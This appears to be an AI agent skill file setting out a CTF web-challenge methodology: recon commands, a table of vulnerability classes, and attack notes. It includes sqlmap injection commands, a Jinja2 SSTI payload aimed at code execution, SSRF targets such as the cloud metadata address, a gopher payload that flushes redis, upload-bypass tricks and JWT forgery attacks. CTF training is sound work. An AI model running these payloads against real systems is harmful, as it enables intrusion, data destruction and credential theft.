---
name: ctf-web
description: Use when solving a CTF web challenge — SQLi, XSS, SSRF, SSTI, IDOR, auth bypass, file upload, deserialization, prototype pollution, race conditions, JWT attacks. Provides a decision tree and tool stack from this installer's web module. Triggers on "ctf web", "web challenge", "sqli", "xss", "ssti", "ssrf", "jwt".
---

# CTF web methodology

## 1. Recon (always)

```bash
# Always start with these — in parallel
curl -sI http://target/                                  # headers
run_tool("ffuf", "-w wordlist -u http://target/FUZZ")   # dir bust
run_tool("gobuster", "dir -u http://target -w wordlist")
run_tool("whatweb", "http://target")                     # tech stack
nikto -h http://target                                   # web scanner
```

Source view:

- `view-source:` — comments, hidden inputs, JS files
- `/robots.txt`, `/sitemap.xml`, `/.git/`, `/.env`, `/.DS_Store`
- `wappalyzer` / `whatweb` for stack — frameworks dictate attack class

## 2. Map the attack surface

For each endpoint:

- Method (GET/POST/PUT/PATCH)
- Parameters (URL, body, headers, cookies)
- Auth requirements
- Reflection points (does input echo back?)
- Storage points (does input persist?)

## 3. Decision tree by symptom

| Symptom | Likely class | Tool |
| --- | --- | --- |
| Input echoed in HTML | XSS | manual + `XSStrike` |
| Error contains SQL | SQLi | `sqlmap` (registry) |
| URL parameter triggers fetch | SSRF | manual + `gopherus` for protocols |
| Template syntax `{{7*7}}` → `49` | SSTI | `tplmap`, manual jinja2/twig payloads |
| Numeric ID in URL/body | IDOR | manual enum + Burp Repeater |
| Login form, error tells "user not found" vs "wrong pass" | User enum | manual |
| File upload | Upload bypass | `BurpSuite`, manual extension/MIME tricks |
| `Cookie:` with base64/JSON | Cookie tampering | manual |
| `Authorization: Bearer eyJ...` | JWT | `jwt_tool`, `jwt-cracker` |
| `__proto__` or `constructor` accepted | Prototype pollution | manual JS payloads |
| Race-prone action (claim, vote) | Race condition | `turbo-intruder` Burp ext |
| Java/PHP/Ruby with unsafe deserialize | Deserialization | `ysoserial`, `phpggc` |

## 4. Specific attack notes

### SQLi

```bash
# Boolean-based, time-based, UNION
sqlmap -u "http://target/page?id=1" --batch --level=5 --risk=3 --dbs

# Cookie/header injection
sqlmap -u http://target/ --cookie="session=*" --level=5

# POST data
sqlmap -u http://target/login --data="user=*&pass=*"
```

### SSTI

Identify engine first: `{{7*7}}` works in Jinja/Twig, `${7*7}` in FreeMarker, `<%= 7*7 %>` in ERB.

Jinja2 RCE: `{{ ''.__class__.__mro__[1].__subclasses__() }}` — find subprocess/Popen.

### SSRF

- Cloud metadata: `http://169.254.169.254/latest/meta-data/`
- Localhost services: `http://127.0.0.1:port/`
- Gopher for raw TCP: `gopher://localhost:6379/_FLUSHALL` for redis
- DNS rebinding for filter bypass

### File upload

Try in order: rename extension (.php → .phtml/.php5/.phar), MIME spoofing, double extension (file.jpg.php), null byte (file.php%00.jpg), magic byte prefix, .htaccess upload, polyglot (PHP-in-JPG).

### JWT

```bash
jwt_tool <token>                          # decode + check
jwt_tool <token> -X a                     # alg=none
jwt_tool <token> -X i                     # weak HMAC
jwt_tool <token> -X k -pk public.pem      # key confusion (RS→HS)
jwt-cracker <token> -d wordlist.txt       # crack HMAC secret
```

## 5. Don't waste time on

- DDOS, brute-forcing rate-limited endpoints (CTF won't gate solves on that)
- Server fingerprinting beyond initial `whatweb` (move on)
- Custom HTTP clients — use `curl` or Burp Repeater

## After solve

Use the `writeup-template` skill.
